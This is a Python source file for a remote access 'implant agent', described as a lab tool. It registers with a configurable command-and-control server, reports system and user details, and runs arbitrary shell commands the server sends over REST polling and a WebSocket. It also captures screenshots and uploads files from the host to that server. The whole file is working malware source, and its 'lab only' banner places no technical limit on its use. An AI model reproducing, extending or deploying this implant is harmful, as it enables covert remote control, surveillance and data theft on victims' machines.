"""
Educational Cybersecurity Lab - Implant Agent
For controlled lab environment testing only
"""

import os
import sys
import json
import uuid
import socket
import platform
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional

import requests
from PIL import ImageGrab, Image
import psutil

# ============ Configuration ============
class Config:
    C2_SERVER = "http://localhost:8000"  # Change to your server IP
    BOT_ID = None
    CHECK_INTERVAL = 30  # seconds
    MAX_RETRIES = 3
    RETRY_DELAY = 5  # seconds

# ============ System Info ============
def get_system_info() -> Dict[str, Any]:
    """Collect system information"""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        
        # Get all network interfaces
        interfaces = psutil.net_if_addrs()
        ip_addresses = []
        for interface_name, interface_addresses in interfaces.items():
            for address in interface_addresses:
                if address.family == socket.AF_INET:
                    ip_addresses.append(address.address)
        
        return {
            "name": hostname,
            "os": platform.system(),
            "os_version": platform.version(),
            "username": os.getlogin() if hasattr(os, 'getlogin') else "Unknown",
            "hostname": hostname,
            "ip_address": ip_address,
            "all_ips": ip_addresses,
            "processor": platform.processor(),
            "architecture": platform.architecture()[0],
            "python_version": platform.python_version(),
            "ram_gb": round(psutil.virtual_memory().total / (1024**3), 2),
            "disk_gb": round(psutil.disk_usage('/').total / (1024**3), 2) if os.name != 'nt' else 
                      round(psutil.disk_usage('C:\\').total / (1024**3), 2),
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        return {
            "name": "Unknown",
            "os": platform.system(),
            "username": "Unknown",
            "hostname": "Unknown",
            "ip_address": "Unknown",
            "error": str(e)
        }

# ============ Command Execution ============
def execute_command(command: str) -> Dict[str, Any]:
    """Execute a system command"""
    try:
        # Parse command
        cmd_parts = command.strip().split()
        if not cmd_parts:
            return {"success": False, "error": "Empty command"}
        
        # Handle special commands
        if cmd_parts[0] == "cd" and len(cmd_parts) > 1:
            try:
                os.chdir(cmd_parts[1])
                return {
                    "success": True,
                    "output": f"Changed directory to {os.getcwd()}",
                    "cwd": os.getcwd()
                }
            except Exception as e:
                return {"success": False, "error": str(e)}
        
        elif cmd_parts[0] == "pwd":
            return {
                "success": True,
                "output": os.getcwd(),
                "cwd": os.getcwd()
            }
        
        elif cmd_parts[0] == "screenshot":
            return take_screenshot()
        
        elif cmd_parts[0] == "sysinfo":
            info = get_system_info()
            info_str = json.dumps(info, indent=2)
            return {
                "success": True,
                "output": info_str,
                "info": info
            }
        
        elif cmd_parts[0] == "download" and len(cmd_parts) > 1:
            # This would be handled by the server sending file
            return {
                "success": True,
                "output": "Download command received. File will be sent by server.",
                "needs_file": True,
                "filename": cmd_parts[1]
            }
        
        elif cmd_parts[0] == "upload" and len(cmd_parts) > 1:
            # This triggers file upload from this machine
            return upload_file(cmd_parts[1])
        
        elif cmd_parts[0] == "ls" or cmd_parts[0] == "dir":
            path = cmd_parts[1] if len(cmd_parts) > 1 else "."
            return list_directory(path)
        
        elif cmd_parts[0] == "whoami":
            return {
                "success": True,
                "output": os.getlogin() if hasattr(os, 'getlogin') else "Unknown"
            }
        
        # Execute shell command
        if platform.system() == "Windows":
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
        else:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
        
        return {
            "success": True,
            "output": result.stdout,
            "error": result.stderr if result.stderr else None,
            "return_code": result.returncode,
            "cwd": os.getcwd()
        }
        
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "Command timed out after 30 seconds"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def list_directory(path: str) -> Dict[str, Any]:
    """List directory contents"""
    try:
        abs_path = os.path.abspath(path)
        if not os.path.exists(abs_path):
            return {"success": False, "error": f"Path does not exist: {path}"}
        
        items = []
        for item in os.listdir(abs_path):
            item_path = os.path.join(abs_path, item)
            try:
                is_dir = os.path.isdir(item_path)
                size = os.path.getsize(item_path) if not is_dir else 0
                items.append({
                    "name": item,
                    "type": "directory" if is_dir else "file",
                    "size": size,
                    "path": item_path
                })
            except:
                items.append({
                    "name": item,
                    "type": "unknown",
                    "size": 0,
                    "path": item_path
                })
        
        return {
            "success": True,
            "output": f"Directory listing for {abs_path}",
            "path": abs_path,
            "items": items,
            "total": len(items)
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

# ============ Screenshot ============
def take_screenshot() -> Dict[str, Any]:
    """Capture screenshot and upload to server"""
    try:
        # Take screenshot
        screenshot = ImageGrab.grab()
        
        # Save to temp file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        temp_path = os.path.join(os.getenv('TEMP', '/tmp'), filename)
        
        screenshot.save(temp_path, 'PNG')
        
        # Upload to server
        if Config.BOT_ID:
            with open(temp_path, 'rb') as f:
                files = {'file': (filename, f, 'image/png')}
                data = {
                    'bot_id': Config.BOT_ID,
                    'file_type': 'screenshot'
                }
                
                response = requests.post(
                    f"{Config.C2_SERVER}/api/upload",
                    files=files,
                    data=data
                )
                
                if response.status_code == 200:
                    result = response.json()
                    os.remove(temp_path)  # Clean up temp file
                    
                    return {
                        "success": True,
                        "output": f"Screenshot uploaded: {result['filename']}",
                        "file_id": result['file_id'],
                        "filepath": result['filepath']
                    }
                else:
                    return {
                        "success": False,
                        "error": f"Upload failed: {response.status_code}",
                        "filepath": temp_path  # Keep temp file for manual upload
                    }
        else:
            return {
                "success": False,
                "error": "Bot not registered",
                "filepath": temp_path
            }
            
    except Exception as e:
        return {"success": False, "error": str(e)}

# ============ File Upload ============
def upload_file(filepath: str) -> Dict[str, Any]:
    """Upload file to server"""
    try:
        if not os.path.exists(filepath):
            return {"success": False, "error": f"File not found: {filepath}"}
        
        if not Config.BOT_ID:
            return {"success": False, "error": "Bot not registered"}
        
        filename = os.path.basename(filepath)
        
        with open(filepath, 'rb') as f:
            files = {'file': (filename, f)}
            data = {
                'bot_id': Config.BOT_ID,
                'file_type': 'document'
            }
            
            response = requests.post(
                f"{Config.C2_SERVER}/api/upload",
                files=files,
                data=data
            )
            
            if response.status_code == 200:
                result = response.json()
                return {
                    "success": True,
                    "output": f"File uploaded: {result['filename']}",
                    "file_id": result['file_id'],
                    "filepath": result['filepath']
                }
            else:
                return {
                    "success": False,
                    "error": f"Upload failed: {response.status_code}"
                }
                
    except Exception as e:
        return {"success": False, "error": str(e)}

# ============ Communication with C2 ============
def register_with_c2() -> Optional[str]:
    """Register this implant with C2 server"""
    try:
        system_info = get_system_info()
        
        response = requests.post(
            f"{Config.C2_SERVER}/api/register",
            json=system_info,
            timeout=10
        )
        
        if response.status_code == 200:
            result = response.json()
            bot_id = result.get("bot_id")
            print(f"[+] Registered with C2 server. Bot ID: {bot_id}")
            return bot_id
        else:
            print(f"[-] Registration failed: {response.status_code}")
            return None
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Cannot connect to C2 server at {Config.C2_SERVER}")
        return None
    except Exception as e:
        print(f"[-] Registration error: {e}")
        return None

def check_for_commands(bot_id: str) -> list:
    """Check for pending commands from C2 server"""
    try:
        response = requests.get(
            f"{Config.C2_SERVER}/api/commands/{bot_id}",
            params={"limit": 10},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            
            # Filter for pending commands
            pending_commands = []
            for cmd in data.get("commands", []):
                if cmd.get("status") == "pending":
                    pending_commands.append({
                        "command_id": cmd["id"],
                        "command": cmd["command"]
                    })
            
            return pending_commands
        else:
            return []
            
    except Exception as e:
        print(f"[-] Error checking commands: {e}")
        return []

def send_command_result(command_id: str, result: Dict[str, Any], status: str = "completed"):
    """Send command execution result back to C2"""
    try:
        result_str = json.dumps(result)
        
        response = requests.post(
            f"{Config.C2_SERVER}/api/command/result",
            data={
                "command_id": command_id,
                "result": result_str,
                "status": status
            },
            timeout=10
        )
        
        if response.status_code == 200:
            print(f"[+] Command result sent: {command_id}")
            return True
        else:
            print(f"[-] Failed to send result: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"[-] Error sending result: {e}")
        return False

# ============ WebSocket Connection ============
def websocket_connection(bot_id: str):
    """Establish WebSocket connection for real-time communication"""
    import asyncio
    import websockets
    
    async def connect():
        uri = f"ws://localhost:8000/ws/bot/{bot_id}".replace("http", "ws")
        
        try:
            async with websockets.connect(uri) as websocket:
                print(f"[+] WebSocket connected: {uri}")
                
                while True:
                    try:
                        # Wait for messages from server
                        message = await websocket.recv()
                        data = json.loads(message)
                        
                        if data.get("type") == "command":
                            command_id = data.get("command_id")
                            command = data.get("command")
                            
                            print(f"[*] Received command: {command}")
                            
                            # Execute command
                            result = execute_command(command)
                            
                            # Send result back
                            await websocket.send(json.dumps({
                                "type": "command_result",
                                "command_id": command_id,
                                "result": result
                            }))
                            
                    except websockets.exceptions.ConnectionClosed:
                        print("[-] WebSocket connection closed")
                        break
                    except Exception as e:
                        print(f"[-] WebSocket error: {e}")
                        
        except Exception as e:
            print(f"[-] WebSocket connection failed: {e}")
    
    # Run WebSocket in separate thread
    def run_websocket():
        asyncio.run(connect())
    
    ws_thread = threading.Thread(target=run_websocket, daemon=True)
    ws_thread.start()

# ============ Main Loop ============
def main_loop():
    """Main implant loop"""
    print("[*] Starting implant agent...")
    print(f"[*] C2 Server: {Config.C2_SERVER}")
    
    # Register with C2
    bot_id = register_with_c2()
    if not bot_id:
        print("[-] Failed to register. Exiting.")
        return
    
    Config.BOT_ID = bot_id
    
    # Start WebSocket connection
    websocket_connection(bot_id)
    
    # Main check-in loop
    print("[*] Starting main loop...")
    
    while True:
        try:
            # Check for commands via REST API (fallback)
            commands = check_for_commands(bot_id)
            
            for cmd in commands:
                command_id = cmd["command_id"]
                command = cmd["command"]
                
                print(f"[*] Executing command: {command}")
                result = execute_command(command)
                
                # Send result back
                send_command_result(command_id, result)
            
            # Sleep before next check
            time.sleep(Config.CHECK_INTERVAL)
            
        except KeyboardInterrupt:
            print("\n[*] Shutting down implant...")
            break
        except Exception as e:
            print(f"[-] Main loop error: {e}")
            time.sleep(Config.RETRY_DELAY)

# ============ Entry Point ============
if __name__ == "__main__":
    # Check if running in lab environment
    print("=" * 50)
    print("EDUCATIONAL CYBERSECURITY LAB IMPLANT")
    print("For controlled lab testing only")
    print("=" * 50)
    
    # Parse command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "--server":
            Config.C2_SERVER = sys.argv[2]
        elif sys.argv[1] == "--help":
            print("Usage: python implant.py [--server http://server:port]")
            sys.exit(0)
    
    try:
        main_loop()
    except KeyboardInterrupt:
        print("\n[*] Implant terminated by user")